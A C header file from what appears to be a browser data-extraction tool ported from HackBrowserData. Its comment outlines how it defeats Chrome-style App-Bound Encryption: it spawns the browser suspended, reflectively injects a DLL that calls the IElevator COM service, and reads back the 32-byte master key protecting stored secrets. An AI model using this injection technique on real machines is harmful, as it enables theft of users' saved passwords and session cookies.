#ifndef ABE_INJECT_H
#define ABE_INJECT_H

#include <stdint.h>

/*
 * App-Bound Encryption master key retrieval (reflective injection).
 *
 * Ported from HackBrowserData crypto/windows/abe_native + utils/injector:
 * spawns the browser executable suspended, injects the embedded ABE payload
 * (a DLL whose Bootstrap export maps itself, calls the browser's IElevator
 * COM elevation service while the process image basename matches the
 * browser, and publishes the 32-byte master key into a scratch region),
 * then reads the key back.
 *
 * Returns 0 on success and fills out_key (32 bytes).
 * Returns non-zero on failure (payload build missing, spawn/inject error,
 * or payload-reported error).
 */
int abe_get_master_key(const char* state_file_path, uint8_t out_key[32]);

/* Diagnostics of the last attempt (for verbose output). */
const char* abe_last_diag(void);

#endif
